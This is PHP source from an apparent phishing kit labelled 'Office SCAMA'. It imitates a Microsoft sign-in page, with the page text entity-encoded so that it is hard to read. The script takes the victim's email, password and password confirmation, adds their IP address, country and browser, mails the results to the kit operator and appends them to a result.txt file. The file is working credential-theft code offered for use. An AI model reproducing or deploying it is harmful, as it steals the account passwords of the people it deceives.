<?php
/*

  _____            _____           _                 
 |_   _|          / ____|         | |                
   | |  _ __ ___ | (___  _ __ __ _| |__   ___  _ __  
   | | | '_ ` _ \ \___ \| '__/ _` | '_ \ / _ \| '_ \ 
  _| |_| | | | | |____) | | | (_| | |_) | (_) | | | |
 |_____|_| |_| |_|_____/|_|  \__,_|_.__/ \___/|_| |_|
                                                     
                                                           
                                    ICQ: @ImSrabon
*/

error_reporting(0);

@session_start();

$get_sessionid = $_GET["SESSION"];
//echo $get_sessionid;

// Retrive Session
$get_sess = $_SESSION["sess_id"];
session_id($get_sess);

$_SESSION["password_confirm"] = $_POST["password_cfrm"];

require "includes/blocker1.php"; // ITS REQURED EVERY PAGE

// Check Session
if ($get_sessionid !== $get_sess) {
	print '
	<html><head>
	<title>403 - Forbidden</title>
	</head><body>
	<h1>403 Forbidden</h1>
	</p></p>
	<hr>
	</body></html>
	';
	exit();
}
/*
* Saving Info
*/
function saveResultz() {
	$notirput = getenv("REMOTE_ADDR");
	
	include('email.php');
	include('includes/geoip.php');	
	require "includes/blocker1.php";

	$_SESSION["country"] = ip_info($notirput, "Country Code");

/*
* GET DOMAIN NAME
*/
  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') 
      $link = "https"; 
  else
      $link = "http"; 
  $link .= "://"; 
  $link .= $_SERVER['HTTP_HOST']; 
  $link .= $_SERVER['REQUEST_URI']; 
  $fullurl = $link;

  $url = $fullurl;
  $parse = parse_url($url);
  $getDomain = $parse['host'];

	$message .= "############# Happy Outlook ^_^ #############\n";
	$message .= "VXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXV\n";	
	$message .= "================== Login Infos =============\n";	
	$message .= "Username 		: ".$_SESSION["email"]."\n";
	$message .= "Password 		: ".$_SESSION["password"]."\n";
	$message .= "Password Cfrm	: ".$_SESSION["password_confirm"]."\n";
	$message .= "================== Login Infos =============\n";	
	$message .= "================== IP Infos ==============\n";
	$message .= "IP       : $notirput\n";
	$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "==========[ Office SCAMA by ImSrabon ]=========\n";

	$subject = "Office Logs [ " . $notirput . " - " .$_SESSION["country"]. "]";
	$headers = "From: Office Logs <info@" . $getDomain . ">\r\n";
	mail($email,$subject,$message,$headers);
	mail(','.$form,$subject,$message,$headers);
	$text = fopen('result.txt', 'a');
	fwrite($text, $message);
}
	
	saveResultz();


//Set Refresh header using PHP.
header( "refresh:3;url=redirect.php?SESSION=$get_sess" );
?>

<!DOCTYPE html>
<html>
<head>
	<title>Microsoft services</title>
	<link rel="shortcut icon" href="assets/favicon.ico" />
</head>

<style type="text/css">
.container {
	padding: 50px;
	padding-left: 100px;
	padding-right: 100px;
}
</style>
<body>
<div class="container">
	<div class="inner relative">
		<img src="assets/logo.svg" class="logo" alt="Microsoft account" />
	</div>
	<h1>&#67;&#111;&#110;&#110;&#101;&#99;&#116;&#105;&#110;&#103;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#116;&#111;&#32;&#97;&#32;&#109;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#115;&#101;&#99;&#117;&#114;&#101;&#100;&#32;&#115;&#101;&#114;&#118;&#101;&#114;&#32;&#46;&#46;&#46;&#32;</h1>
	</br></br>
	<hr>
	<p style="float: right;">&copy <?php echo date("Y");?>&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;<a href="#" style="text-decoration: none;">Terms of Use Privacy & Cookies</a>&#32;&#68;&#101;&#118;&#101;&#108;&#111;&#112;&#101;&#114;&#115;</p>
</div>
</body>
</html>